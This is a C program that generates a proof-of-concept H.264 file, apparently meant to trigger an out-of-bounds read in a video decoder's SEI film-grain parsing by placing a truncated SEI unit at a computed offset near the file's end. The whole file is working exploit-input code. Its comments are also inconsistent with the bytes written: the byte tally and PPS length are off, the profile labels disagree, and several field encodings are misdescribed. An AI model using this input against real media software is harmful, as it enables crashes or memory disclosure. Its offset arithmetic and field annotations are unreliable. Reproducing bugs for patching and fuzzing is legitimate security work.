#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write start code prefix for SPS */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* SPS NAL header: 0x67 (AVC baseline, nal_unit_type=7) */
    fputc(0x67, f);

    /* Minimal SPS payload (12 bytes): profile_idc=100, constraints=0, level_idc=20,
       seq_parameter_set_id=0, log2_max_frame_num=4, pic_order_cnt_type=0,
       max_num_ref_frames=1, gaps_in_frame_num=0, pic_width=352, pic_height=288,
       frame_cropping=0, vui_parameters=0 */
    fputc(0x64, f); /* profile_idc = 100 (High) */
    fputc(0x00, f); /* constraint_set0_flag=0, ... */
    fputc(0x14, f); /* level_idc = 20 */
    fputc(0x80, f); /* seq_parameter_set_id=0, log2_max_frame_num_minus4=0 */
    fputc(0x00, f); /* pic_order_cnt_type=0, log2_max_pic_order_cnt_lsb_minus4=0 */
    fputc(0x01, f); /* max_num_ref_frames=1 */
    fputc(0x00, f); /* gaps_in_frame_num_allowed_flag=0 */
    fputc(0x7f, f); /* pic_width_in_mbs_minus1 = 21 (352/16 - 1) */
    fputc(0x11, f); /* pic_height_in_map_units_minus1 = 17 (288/16 - 1) */
    fputc(0x00, f); /* frame_mbs_only_flag=1, mb_adaptive_frame_field=0, direct_8x8_inference=0 */
    fputc(0x00, f); /* frame_cropping_flag=0 */
    fputc(0x00, f); /* vui_parameters_present_flag=0 */

    /* Write PPS NAL unit */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    fputc(0x68, f); /* PPS NAL header */
    fputc(0x00, f); /* pic_parameter_set_id=0 */
    fputc(0x01, f); /* seq_parameter_set_id=0 */
    fputc(0x00, f); /* entropy_coding_mode_flag=0 */
    fputc(0x00, f); /* bottom_field_pic_order_in_frame_present_flag=0 */
    fputc(0x00, f); /* num_slice_groups_minus1=0 */
    fputc(0x00, f); /* num_ref_idx_l0_default_active_minus1=0 */
    fputc(0x00, f); /* num_ref_idx_l1_default_active_minus1=0 */
    fputc(0x00, f); /* weighted_pred_flag=0, weighted_bipred_idc=0 */
    fputc(0x00, f); /* pic_init_qp_minus26=0, pic_init_qs_minus26=0 */
    fputc(0x00, f); /* chroma_qp_index_offset=0, deblocking_filter_control_present_flag=0 */
    fputc(0x00, f); /* constrained_intra_pred_flag=0, redundant_pic_cnt_present_flag=0 */

    /* Write IDR slice NAL unit (minimal I-slice) */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);
    fputc(0x65, f); /* IDR slice NAL header (nal_unit_type=5, nal_ref_idc=3) */
    /* Minimal slice header: first_mb_in_slice=0, slice_type=2 (I slice),
       pic_parameter_set_id=0, frame_num=0, idr_pic_id=0 */
    fputc(0x88, f); /* first_mb_in_slice=0, slice_type=2 (I slice) */
    fputc(0x00, f); /* pic_parameter_set_id=0, frame_num=0 */
    fputc(0x00, f); /* idr_pic_id=0 */
    /* Slice data: just a few bytes to make it valid */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    /* Now we have written: 3+1+12 + 3+1+10 + 3+1+6 = 40 bytes.
       We need to fill up to offset 255993 so that SEI starts at 255993.
       Total filler needed = 255993 - 40 = 255953 bytes.
       We'll write additional valid slice data (zeros are acceptable within slices). */
    size_t filler_len = 255993 - 40;
    for (size_t i = 0; i < filler_len; i++) {
        fputc(0x00, f);
    }

    /* Now at offset 255993. Write start code for SEI */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* SEI NAL unit:
       - NAL header: 0x06 (nal_unit_type=6, nal_ref_idc=0)
       - Payload type: 0x01 (Film Grain Characteristics)
       - Payload size: 0x04 (request 4 bytes)
       Total: 3 bytes. File ends at offset 255999.
       The decoder will attempt to read 4 bytes starting at offset 255999,
       which will access indices 255999-256002. Index 256000 is out of bounds. */
    fputc(0x06, f); /* SEI NAL header */
    fputc(0x01, f); /* payload type = Film Grain Characteristics */
    fputc(0x04, f); /* payload size = 4 (no payload bytes follow) */

    fclose(f);
    return 0;
}